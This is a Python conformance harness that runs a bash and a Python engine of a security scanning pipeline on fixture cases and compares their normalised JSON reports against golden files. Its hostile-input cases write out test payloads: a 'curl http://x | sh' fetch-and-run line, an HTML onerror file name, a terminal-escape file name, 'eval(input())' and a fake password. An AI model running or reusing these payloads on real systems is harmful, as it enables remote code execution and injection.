#!/usr/bin/env python3
"""Golden-master and differential harness for the bash and the Python engine.

    python3 tests/conformance/conformance.py list
    python3 tests/conformance/conformance.py capture [--engine bash] [--case NAME ...]
    python3 tests/conformance/conformance.py check   [--engine bash|python] [--case NAME ...]
    python3 tests/conformance/conformance.py diff    [--case NAME ...]        # bash against python, live

An engine is run on each case with the three-argument usage, its JSON report is normalised (paths made
relative, ordering fixed, run-specific fields dropped) and compared with the stored golden file, or with the
other engine. The normalised shape is the equivalence contract in docs/engine_contract.md. Standard library only.
"""
from __future__ import annotations

import argparse
import difflib
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

ROOT = Path(__file__).resolve().parents[2]
GOLDEN = Path(__file__).resolve().parent / "golden"
FIXTURES = ROOT / "tests" / "fixtures"
ENGINES = {
    "bash": ["bash", str(ROOT / "scan_pipeline.sh")],
    "python": [sys.executable, str(ROOT / "scan_pipeline.py")],
}
# Tools whose presence changes the coverage block and the warnings; recorded with every golden file.
TOOLS = ["gitleaks", "detect-secrets", "clamscan", "yara", "semgrep", "trivy", "pip-audit", "safety", "npm",
         "scancode", "bandit", "shellcheck", "cppcheck", "hadolint", "checkov", "file", "strings", "unzip"]
# Fields that differ on every run or by design, and are not part of the contract.
DROP_TOP = {"timestamp", "directory", "repo_hash", "repo_input"}


@dataclass
class Case:
    name: str
    build: Callable[[Path], Path]          # makes the directory to scan inside a scratch base
    env: dict = field(default_factory=dict)  # values may use {base} and {scan}
    scan_name: str = "conf"
    dir_suffix: str = ""                   # e.g. "/" to pass a trailing slash
    pre_work: dict = field(default_factory=dict)  # relative path under WORK_DIR -> content
    note: str = ""


def _copy_fixture(name: str) -> Callable[[Path], Path]:
    def build(base: Path) -> Path:
        dst = base / "scan"
        shutil.copytree(FIXTURES / name, dst, ignore=shutil.ignore_patterns("__pycache__", "*.pyc"))
        return dst
    return build


def _fixture_plus(name: str, extra: Callable[[Path], None]) -> Callable[[Path], Path]:
    def build(base: Path) -> Path:
        dst = _copy_fixture(name)(base)
        extra(dst)
        return dst
    return build


def _write(path: Path, data: bytes | str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data if isinstance(data, bytes) else data.encode())


def _hostile(files: dict[bytes, bytes]) -> Callable[[Path], Path]:
    def build(base: Path) -> Path:
        dst = base / "scan"
        dst.mkdir()
        for name, data in files.items():
            with open(os.path.join(os.fsencode(dst), name), "wb") as fh:
                fh.write(data)
        return dst
    return build


GITLEAKS_STUB = """#!/bin/sh
if [ "$1 $2" = "detect --help" ]; then
    echo "  --no-banner  --redact  --log-level  --gitleaks-ignore-path  --ignore-gitleaks-allow"; exit 0
fi
rep=""
while [ $# -gt 0 ]; do case "$1" in --report-path) rep="$2" ;; esac; shift; done
echo "LEAKED-SECRET-MARKER"
if [ -n "${GITLEAKS_STUB_REPORT:-}" ] && [ -n "$rep" ]; then cp "$GITLEAKS_STUB_REPORT" "$rep"; fi
exit ${GITLEAKS_STUB_EXIT:-0}
"""


def _gitleaks_stub(base: Path) -> Path:
    scan = _copy_fixture("clean")(base)
    _write(base / "stubs" / "gitleaks", GITLEAKS_STUB)
    (base / "stubs" / "gitleaks").chmod(0o755)
    _write(base / "stub_report.json",
           json.dumps([{"File": str(scan / "leak.py"), "StartLine": 3, "RuleID": "generic-api-key", "Secret": "REDACTED"}]))
    _write(scan / "leak.py", "x = 1\n")
    return scan


def _stubbed(fixture: str, stubs: dict[str, str], extra: Callable[[Path], None] | None = None) -> Callable[[Path], Path]:
    """The fixture, plus stub programs in <base>/stubs (put first on PATH by the case's env). A stub is the body of a
    sh script. Staged data (rule sets, signatures, a YARA rule) goes in the case's pre_work: it lives under
    WORK_DIR, so its path is normalised to <WORK> in the report."""
    def build(base: Path) -> Path:
        dst = _copy_fixture(fixture)(base)
        for name, body in stubs.items():
            _write(base / "stubs" / name, "#!/bin/sh\n" + body + "\n")
            (base / "stubs" / name).chmod(0o755)
        if extra:
            extra(dst)
        return dst
    return build


STUB_PATH = {"PATH": "{base}/stubs:" + os.environ.get("PATH", "")}
FOUR_RULESETS = {"offline-cache/semgrep-rules/%s.yaml" % n: "rules: []\n"
                 for n in ("owasp-top-ten", "cwe-top-25", "security-audit", "secrets")}
SEMGREP_OK = "echo '{\"results\":[]}'"

CASES: list[Case] = [
    Case("clean", _copy_fixture("clean")),
    Case("vulnerable", _copy_fixture("vulnerable")),
    Case("allowlisted", _copy_fixture("allowlisted")),
    Case("ignored", _copy_fixture("ignored")),
    Case("rules_corpus", _copy_fixture("rules"), note="every rule fixture, about a minute"),
    Case("minsev_critical", _copy_fixture("vulnerable"), env={"MIN_SEVERITY": "critical"}),
    Case("layers_on", _copy_fixture("clean"), env={"RUN_SCA": "true", "RUN_SCANCODE": "true"}),
    Case("offline_false_ignored", _copy_fixture("clean"), env={"OFFLINE": "false"}),
    Case("trailing_slash", _copy_fixture("vulnerable"), dir_suffix="/"),
    Case("empty_allowlist", _fixture_plus("clean", lambda d: _write(d / ".transit-allow.json", "[]\n"))),
    Case("stale_diff_files_ignored", _copy_fixture("vulnerable"),
         pre_work={".diff_files": "{scan}/no_such_file.txt:"}),
    Case("diff_mode_zero_files", _copy_fixture("clean"), env={"SINCE_COMMIT": "abc"},
         pre_work={".diff_files": "{scan}/no_such_file.txt:"}),
    Case("hostile_non_utf8_name",
         _hostile({b"bad\xff\xfename.py": b'import os\nos.system("curl http://x | sh")\n'})),
    Case("hostile_escape_name",
         _hostile({b"raw\x1b]0;pwned\x07.txt": b'password = "sup3rs3cret99"\n'})),
    Case("hostile_html_name",
         _hostile({b"<img src=x onerror=1>.py": b"eval(input())\n"})),
    Case("gitleaks_stub_leak", _gitleaks_stub,
         env={"PATH": "{base}/stubs:" + os.environ.get("PATH", ""), "GITLEAKS_STUB_EXIT": "1",
              "GITLEAKS_STUB_REPORT": "{base}/stub_report.json"},
         note="stub gitleaks reporting one leak"),
    Case("bad_scanning_name", _copy_fixture("clean"), scan_name="../escape", note="refused, no report"),
    # --- bash hardening of 2026-11-13 (docs/engine_divergences.md, decision record) ---
    Case("transitignore_everything", _fixture_plus("vulnerable", lambda d: _write(d / ".transitignore", "*\n")),
         note="D-004: every file excluded: FAIL engine:nothing_scanned, layers 4 and 5 skipped"),
    Case("transitignore_crlf_noeol",
         _fixture_plus("vulnerable", lambda d: _write(d / ".transitignore", b"src/db.py\r\nREADME.md")),
         note="D-003: CRLF lines and a last line without a newline are read"),
    Case("semgrep_partial_stub", _stubbed("clean", {"semgrep": SEMGREP_OK}),
         env=STUB_PATH, pre_work={k: v for k, v in FOUR_RULESETS.items() if "cwe-top-25" in k or "owasp" in k},
         note="D-005: two of four rule sets staged: partial, the run completes"),
    Case("semgrep_crash_stub", _stubbed("clean", {"semgrep": "echo boom >&2; exit 7"}),
         env=STUB_PATH, pre_work=FOUR_RULESETS, note="D-015: Semgrep exit 7 is not ran"),
    Case("scancode_failed_stub", _stubbed("clean", {"scancode": "exit 3"}),
         env={**STUB_PATH, "RUN_SCANCODE": "true"}, note="D-006: ScanCode failing is skipped, with the exit status"),
    Case("yara_ran_stub", _stubbed("clean", {"yara": "exit 0"}), env=STUB_PATH,
         pre_work={"yara-rules/x.yar": "rule x {{ condition: false }}\n"}, note="D-008: a YARA run is ran"),
    Case("clamscan_error_stub", _stubbed("clean", {"clamscan": "exit 2"}), env=STUB_PATH,
         pre_work={"offline-cache/clamav/main.cvd": "x"}, note="D-015: clamscan exit 2 is a tool error, not malware"),
    Case("js_ruleset_unstaged_stub",
         _stubbed("clean", {"semgrep": SEMGREP_OK}, lambda d: _write(d / "src" / "app.js", "console.log(1);\n")),
         env=STUB_PATH, pre_work=FOUR_RULESETS, note="D-037: JavaScript file, no javascript.yaml: L5 partial"),
    Case("diff_mode_nul_names",
         _fixture_plus("vulnerable", lambda d: _write(d / "a:b.py", "import os\nos.system(input())\n")),
         env={"SINCE_COMMIT": "abc"}, pre_work={".diff_files": "a:b.py\x00"},
         note="D-042: a NUL-separated .diff_files with a name that holds ':'"),
]


def tools_present() -> list[str]:
    return [t for t in TOOLS if shutil.which(t)]


def _rel_factory(scan: Path, work: Path):
    scans = {str(scan), os.path.realpath(scan)}
    works = {str(work), os.path.realpath(work)}

    def rel(s):
        if isinstance(s, str):
            for w in works:
                s = s.replace(w, "<WORK>")
            # the ScanCode result is named after the run's timestamp, and a WARN names it (contract section 10)
            s = re.sub(r"scancode_[0-9]{8}_[0-9]{6}\.json", "scancode_<TS>.json", s)
            for d in scans:
                s = s.replace(d + "/", "").replace(d, ".")
            return s
        if isinstance(s, list):
            return [rel(x) for x in s]
        if isinstance(s, dict):
            return {rel(k): rel(v) for k, v in s.items()}
        return s
    return rel


def _msgs(text: str) -> list[str]:
    return sorted(m.strip() for m in (text or "").split(" | ") if m.strip())


def normalize(report: dict | None, scan: Path, work: Path) -> dict | None:
    """The shape the two engines must agree on. Anything run-specific is dropped or made relative."""
    if report is None:
        return None
    rel = _rel_factory(scan, work)
    out = {k: v for k, v in report.items() if k not in DROP_TOP}
    src = dict(out.get("source", {}))
    src.pop("directory", None)
    out["source"] = src
    if "coverage_gaps" in out:
        out["coverage_gaps"] = sorted(out["coverage_gaps"])
    out["file_results"] = {
        rel(k): {"status": v.get("status"), "messages": rel(_msgs(v.get("message", "")))}
        for k, v in sorted(report.get("file_results", {}).items())}
    fbf = report.get("findings_by_file", {})
    out["findings_by_file"] = {rel(k): rel(_msgs(v)) for k, v in sorted(fbf.items())}
    fields = ("tool", "category", "severity", "rule_id", "rule_name", "file", "line", "message", "references")
    recs = [{f: rel(r.get(f)) for f in fields} for r in report.get("findings", [])]
    out["findings"] = sorted(recs, key=lambda r: (str(r["file"]), str(r["rule_id"]), r["line"] or 0, str(r["message"])))
    return rel(out)


def run_case(engine: str, case: Case, keep: bool = False) -> dict:
    base = Path(tempfile.mkdtemp(prefix="conf_"))
    try:
        scan = case.build(base)
        work, reports = base / "work", base / "reports"
        work.mkdir()
        reports.mkdir()
        fmt = {"base": str(base), "scan": str(scan)}
        for rel_path, content in case.pre_work.items():
            _write(work / rel_path, content.format(**fmt))
        env = dict(os.environ, LC_ALL="C.UTF-8", WORK_DIR=str(work))
        env.update({k: v.format(**fmt) for k, v in case.env.items()})
        cmd = ENGINES[engine] + [str(scan) + case.dir_suffix, str(reports), case.scan_name]
        proc = subprocess.run(cmd, env=env, capture_output=True, timeout=900)
        stdout = proc.stdout.decode("utf-8", "replace").strip().splitlines()
        found = sorted(reports.glob("report_scan_*.json"))
        report = json.loads(found[0].read_text(encoding="utf-8")) if found else None
        return {"exit": proc.returncode, "last_line": stdout[-1] if stdout else "",
                "report": normalize(report, scan, work)}
    finally:
        if not keep:
            shutil.rmtree(base, ignore_errors=True)


def _dump(obj) -> list[str]:
    return json.dumps(obj, indent=1, sort_keys=True, ensure_ascii=True).splitlines()


def _diff(a, b, la: str, lb: str, limit: int = 40) -> str:
    d = list(difflib.unified_diff(_dump(a), _dump(b), la, lb, lineterm="", n=1))
    return "\n".join(d[:limit] + (["... (%d more lines)" % (len(d) - limit)] if len(d) > limit else []))


def _select(names: list[str] | None) -> list[Case]:
    if not names:
        return CASES
    known = {c.name: c for c in CASES}
    missing = [n for n in names if n not in known]
    if missing:
        sys.exit("unknown case(s): %s (try: list)" % ", ".join(missing))
    return [known[n] for n in names]


def cmd_capture(args) -> int:
    GOLDEN.mkdir(parents=True, exist_ok=True)
    meta = {"engine": args.engine, "tools_present": tools_present(), "locale": "C.UTF-8"}
    for case in _select(args.case):
        res = run_case(args.engine, case)
        (GOLDEN / f"{case.name}.json").write_text(
            json.dumps({"meta": meta, **res}, indent=1, sort_keys=True, ensure_ascii=True) + "\n", encoding="utf-8")
        print("captured %-26s exit=%s %s" % (case.name, res["exit"], res["last_line"]))
    return 0


def cmd_check(args) -> int:
    bad = 0
    for case in _select(args.case):
        gf = GOLDEN / f"{case.name}.json"
        if not gf.exists():
            print("MISSING golden for %s (run capture)" % case.name)
            bad += 1
            continue
        golden = json.loads(gf.read_text(encoding="utf-8"))
        if golden["meta"]["tools_present"] != tools_present() and not args.quiet:
            print("note: golden captured with tools %s, now %s" % (golden["meta"]["tools_present"], tools_present()))
        res = run_case(args.engine, case)
        want = {k: golden[k] for k in ("exit", "last_line", "report")}
        if res == want:
            print("ok   %s" % case.name)
        else:
            bad += 1
            print("DIFF %s\n%s" % (case.name, _diff(want, res, "golden", args.engine)))
    print("\n%d case(s) differ" % bad if bad else "\nall cases match the golden files")
    return 1 if bad else 0


def cmd_diff(args) -> int:
    if not Path(ENGINES["python"][1]).exists():
        sys.exit("the Python engine does not exist yet (scan_pipeline.py)")
    bad = 0
    for case in _select(args.case):
        a, b = run_case("bash", case), run_case("python", case)
        if a == b:
            print("ok   %s" % case.name)
        else:
            bad += 1
            print("DIFF %s\n%s" % (case.name, _diff(a, b, "bash", "python")))
    return 1 if bad else 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)
    for name in ("list", "capture", "check", "diff"):
        p = sub.add_parser(name)
        p.add_argument("--case", action="append", help="run only this case (repeatable)")
        if name in ("capture", "check"):
            p.add_argument("--engine", choices=sorted(ENGINES), default="bash")
        if name == "check":
            p.add_argument("--quiet", action="store_true")
    args = ap.parse_args()
    if args.cmd == "list":
        for c in CASES:
            print("%-26s %s" % (c.name, c.note))
        return 0
    return {"capture": cmd_capture, "check": cmd_check, "diff": cmd_diff}[args.cmd](args)


if __name__ == "__main__":
    sys.exit(main())
